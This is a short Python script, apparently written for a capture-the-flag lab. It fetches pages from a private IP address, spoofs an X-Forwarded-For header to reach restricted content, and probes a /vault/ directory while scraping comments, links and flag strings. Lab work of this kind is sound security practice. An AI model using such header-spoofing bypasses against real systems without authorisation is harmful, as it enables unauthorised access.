import urllib.request
import urllib.error
import re

def get_page(url, headers=None):
    if headers is None:
        headers = {}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            body = resp.read().decode('utf-8', errors='ignore')
            return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)

code, headers, body = get_page('http://192.168.60.139/')
print("=== PORT 80 Normal ===")
print("Status:", code)
print("Headers:", headers)
print("Comments:", re.findall(r'<!--(.*?)-->', body, re.DOTALL))
print("Flags:", re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', body))

code_xff, headers_xff, body_xff = get_page('http://192.168.60.139/', {'X-Forwarded-For': '192.168.60.1'})
print("\n=== PORT 80 XFF 192.168.60.1 ===")
print("Status:", code_xff)
print("Title:", re.findall(r'<title>(.*?)</title>', body_xff, re.I))
print("Comments:", re.findall(r'<!--(.*?)-->', body_xff, re.DOTALL))
print("Flags:", re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', body_xff))

links = re.findall(r'href=["\'](.*?)["\']', body_xff)
print("Links:", links)

# Check /vault/
code_v, headers_v, body_v = get_page('http://192.168.60.139/vault/', {'X-Forwarded-For': '192.168.60.1'})
print("\n=== /vault/ Directory ===")
print("Status:", code_v)
print("Vault links:", re.findall(r'href=["\'](.*?)["\']', body_v))
print("Vault body snippet:\n", body_v[:500])

